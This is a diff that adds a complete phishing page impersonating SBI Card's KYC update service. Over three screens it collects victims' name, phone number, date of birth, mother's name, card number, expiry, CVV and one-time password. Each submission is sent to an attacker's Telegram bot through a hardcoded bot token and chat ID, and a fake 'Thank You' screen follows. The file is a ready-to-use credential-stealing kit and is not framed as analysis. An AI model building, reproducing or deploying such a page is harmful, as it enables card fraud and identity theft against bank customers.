@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SBI Card - KYC Update</title>
+  <style>
+    * {
+      font-family: Georgia, serif;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 1140px;
+      margin: 0 auto;
+      padding: 0 15px;
+    }
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      margin: 0 -15px;
+    }
+    .col-lg-6 { flex: 0 0 50%; max-width: 50%; padding: 0 15px; }
+    .offset-lg-3 { margin-left: 25%; }
+    .col-md-8 { flex: 0 0 66.666%; max-width: 66.666%; }
+    .offset-md-2 { margin-left: 16.666%; }
+    .col-12 { flex: 0 0 100%; max-width: 100%; }
+    .col-25 { flex: 0 0 100%; max-width: 100%; padding: 0 15px; }
+    @media (max-width: 991px) {
+      .col-lg-6, .offset-lg-3 { flex: 0 0 100%; max-width: 100%; margin-left: 0; }
+      .col-md-8, .offset-md-2 { flex: 0 0 100%; max-width: 100%; margin-left: 0; }
+    }
+    .form-group { margin-bottom: 20px; }
+    label { display: block; margin-bottom: 5px; }
+    .card {
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      margin-top: 0px;
+    }
+    .form-group label { font-weight: 600; }
+    .split-input { display: flex; }
+    .split-input .form-group { flex: 1; margin-right: 7px; }
+    .split-input .form-group:last-child { margin-right: 0; }
+    .error-message { color: red; font-size: 13px; }
+    .center {
+      margin-bottom: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      width: 100%;
+    }
+    input[type="text"],
+    input[type="tel"],
+    input[type="number"],
+    select {
+      background-color: #F7F7FF;
+      width: 100%;
+      height: 55px;
+      padding: 8px;
+      border-radius: 10px;
+      box-sizing: border-box;
+      border: 1.3px solid #000000;
+      color: black;
+      font-size: 19px;
+      outline: none;
+    }
+    ::placeholder { color: black; font-size: 19px; opacity: 1; }
+    input[type="submit"] {
+      background-color: #00B4F7;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      text-align: center;
+      border-radius: 20px;
+      cursor: pointer;
+      height: 50px;
+      font-size: 21px;
+      font-weight: bold;
+      width: 100%;
+    }
+    input[type="submit"]:hover { background-color: #0099d6; }
+    #card-number::placeholder,
+    #expiration-date::placeholder,
+    #cvv::placeholder,
+    #otp::placeholder { font-size: 20px; color: black; }
+    #cardholder-name::placeholder { font-size: 19px; color: black; }
+
+    /* Thank you screen */
+    .thankyou-wrap { text-align: center; padding: 0; }
+    .thankyou-wrap .header {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-bottom: 1px solid #ccc;
+    }
+    .thankyou-wrap .header img { width: 100px; }
+    .thankyou-wrap .content { padding: 50px 20px; }
+    .thankyou-wrap h1 { color: #0078d4; font-size: 2.5em; margin: 10px 0; }
+    .thankyou-wrap p { color: #333; font-size: 1.2em; }
+    .thankyou-wrap .content img { max-width: 160px; margin-bottom: 15px; }
+    .download-btn {
+      background: linear-gradient(90deg, #e44d26, #ff7a59);
+      color: #fff;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 600;
+      font-family: sans-serif;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(228, 77, 38, .25);
+      transition: .2s;
+    }
+    .download-btn:hover { transform: translateY(-2px); }
+
+    /* Screen visibility */
+    .screen { display: none; }
+    .screen.active { display: block; }
+  </style>
+</head>
+<body>
+
+  <!-- ============ SCREEN 1: PERSONAL DETAILS (index.html) ============ -->
+  <div id="screen-index" class="screen active">
+    <img src="logo11.png" alt="SBI Card" class="center" onerror="this.style.display='none'">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
+          <div class="card">
+            <form id="myForm">
+              <div class="form-group">
+                <label for="fullname"></label>
+                <input type="text" id="fullname" name="fullname" placeholder="Full Name" required>
+              </div>
+              <div class="form-group">
+                <label for="mobile"></label>
+                <input type="tel" id="mobile" name="mobile" placeholder="+91- Reg... Mobile No." required>
+              </div>
+              <div class="form-group">
+                <label for="dob"></label>
+                <input type="text" id="dob" name="dob" placeholder="Date Of Birth" required>
+              </div>
+              <div class="form-group">
+                <label for="mothername"></label>
+                <input type="text" id="mothername" name="mothername" placeholder="Mother Name" required>
+              </div>
+              <div class="form-group">
+                <label for="service"></label>
+                <select id="service" name="service" required>
+                  <option value="">-- Select a service --</option>
+                  <option value="KYC Update">KYC Update</option>
+                  <option value="Card Blocked">Card Blocked</option>
+                  <option value="Card Unlocked">Card Unlocked</option>
+                  <option value="Collect reward points">Collect reward points</option>
+                  <option value="Due Payment Related">Due Payment Related</option>
+                  <option value="Other Services">Other Services</option>
+                </select>
+              </div>
+              <br>
+              <input type="submit" value="NEXT">
+            </form>
+            <br><br><br><br>
+            <img src="logo22.jpg" alt="SBI Card" class="center" onerror="this.style.display='none'">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 2: CARD DETAILS (car.html) ============ -->
+  <div id="screen-card" class="screen">
+    <img src="logo11.png" alt="SBI Card" class="center" onerror="this.style.display='none'">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
+          <div class="card">
+            <form id="registrationForm">
+              <div class="form-group">
+                <label for="card-number"></label>
+                <input type="number" id="card-number" name="credit-card" placeholder="16 Digit Card No." required>
+                <span id="card-number-error" class="error-message"></span>
+              </div>
+              <div class="split-input">
+                <div class="form-group">
+                  <label for="expiration-date"></label>
+                  <input type="text" id="expiration-date" name="expiration-date" placeholder="MM/YY" required>
+                  <span id="expiration-date-error" class="error-message"></span>
+                </div>
+                <div class="form-group">
+                  <label for="cvv"></label>
+                  <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
+                  <span id="cvv-error" class="error-message"></span>
+                </div>
+              </div>
+              <br>
+              <div class="form-group">
+                <input type="submit" value="NEXT">
+              </div>
+            </form>
+          </div>
+          <img src="logo22.jpg" alt="SBI Card" class="center" onerror="this.style.display='none'">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 3: OTP (otp.html) ============ -->
+  <div id="screen-otp" class="screen">
+    <img src="logo11.png" alt="SBI Card" class="center" onerror="this.style.display='none'">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
+          <div class="card">
+            <form id="otpForm">
+              <div class="form-group">
+                <label for="otp"></label>
+                <input type="number" id="otp" name="otp" placeholder="Enter 6 Digit OTP" required>
+                <span id="otp-error" class="error-message"></span>
+              </div>
+              <br>
+              <div class="form-group">
+                <input type="submit" value="NEXT">
+              </div>
+            </form>
+          </div>
+          <img src="logo22.jpg" alt="SBI Card" class="center" onerror="this.style.display='none'">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 4: THANK YOU (clone.html) ============ -->
+  <div id="screen-thankyou" class="screen">
+    <div class="thankyou-wrap">
+      <div class="header">
+        <img src="logo.png" alt="SBI Card Logo" onerror="this.style.display='none'">
+      </div>
+      <div class="content">
+        <img src="download.gif" alt="Success" onerror="this.style.display='none'">
+        <h1>Thank You!</h1>
+        <p>Your request has been successfully completed.</p>
+        <button class="download-btn" onclick="alert('PDF download will begin shortly.')">📄 Download PDF Now</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ============ CONFIG ============ */
+    const BOT_TOKEN = '8466021233:AAEIU-8rEREGlbTTj-XmMtjBaJJXMTXARx8';
+    const CHAT_ID   = '8148335859';
+
+    /* ============ SCREEN NAVIGATION ============ */
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    /* ============ TELEGRAM SEND HELPER ============ */
+    function sendTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+      });
+    }
+
+    /* ============ SCREEN 1: PERSONAL DETAILS ============ */
+    document.getElementById('myForm').addEventListener('submit', function (event) {
+      event.preventDefault();
+      const formData = new FormData(this);
+      let messageText = 'New Registration:\n';
+      for (const [key, value] of formData.entries()) {
+        messageText += `${key}: ${value}\n`;
+      }
+      sendTelegram(messageText)
+        .then(r => r.json())
+        .then(data => {
+          console.log(data);
+          showScreen('screen-card');
+        })
+        .catch(err => {
+          console.error('Error:', err);
+          // Still proceed for smoother UX if network fails
+          showScreen('screen-card');
+        });
+    });
+
+    /* ============ SCREEN 2: CARD DETAILS ============ */
+    document.getElementById('registrationForm').addEventListener('submit', function (event) {
+      event.preventDefault();
+      const form = event.target;
+      const creditCard = form['credit-card'].value;
+      const expiryDate = form['expiration-date'].value;
+      const cvv = form['cvv'].value;
+
+      // Basic validation before proceeding
+      const cardOk = /^\d{16}$/.test(creditCard.replace(/\s/g, ''));
+      const expOk  = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate);
+      const cvvOk  = /^\d{3}$/.test(cvv);
+      if (!cardOk || !expOk || !cvvOk) {
+        alert('Please correct the highlighted fields before proceeding.');
+        return;
+      }
+
+      const message = `New Card Details:\nCredit Card: ${creditCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;
+      sendTelegram(message)
+        .then(r => r.json())
+        .then(data => {
+          console.log(data);
+          showScreen('screen-otp');
+        })
+        .catch(err => {
+          console.error('Error:', err);
+          showScreen('screen-otp');
+        });
+    });
+
+    // Card number validation
+    document.getElementById('card-number').addEventListener('input', function (e) {
+      const value = e.target.value.replace(/\D/g, '');
+      const isValid = /^\d{16}$/.test(value);
+      document.getElementById('card-number-error').textContent =
+        isValid || value.length === 0 ? '' : 'Please enter a valid 16-digit Card No.';
+    });
+
+    // Expiration date validation (auto-inserts "/")
+    document.getElementById('expiration-date').addEventListener('input', function (e) {
+      const target = e.target;
+      let value = target.value.replace(/\D/g, '');
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+      target.value = value;
+      const isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(target.value);
+      document.getElementById('expiration-date-error').textContent =
+        isValid || target.value.length === 0 ? '' : 'Please enter a valid MM/YY expiration date';
+    });
+
+    // CVV validation
+    document.getElementById('cvv').addEventListener('input', function (e) {
+      const value = e.target.value.replace(/\D/g, '');
+      const isValid = /^\d{3}$/.test(value);
+      document.getElementById('cvv-error').textContent =
+        isValid || value.length === 0 ? '' : 'Please enter a valid 3-digit CVV';
+    });
+
+    /* ============ SCREEN 3: OTP ============ */
+    document.getElementById('otpForm').addEventListener('submit', function (event) {
+      event.preventDefault();
+      const otpValue = document.getElementById('otp').value;
+      const isValid = /^\d{6}$/.test(otpValue);
+      if (!isValid) {
+        document.getElementById('otp-error').textContent = 'Please enter a valid 6-digit OTP';
+        return;
+      }
+      document.getElementById('otp-error').textContent = '';
+
+      const message = `New OTP received: ${otpValue}`;
+      sendTelegram(message)
+        .then(r => r.json())
+        .then(data => {
+          console.log('Message sent successfully', data);
+          showScreen('screen-thankyou');
+        })
+        .catch(err => {
+          console.error('Error:', err);
+          showScreen('screen-thankyou');
+        });
+    });
+
+    // OTP live validation
+    document.getElementById('otp').addEventListener('input', function (e) {
+      const value = e.target.value.replace(/\D/g, '');
+      const isValid = /^\d{6}$/.test(value);
+      document.getElementById('otp-error').textContent =
+        isValid || value.length === 0 ? '' : 'Please enter a valid 6-digit OTP';
+    });
+  </script>
+</body>
+</html>
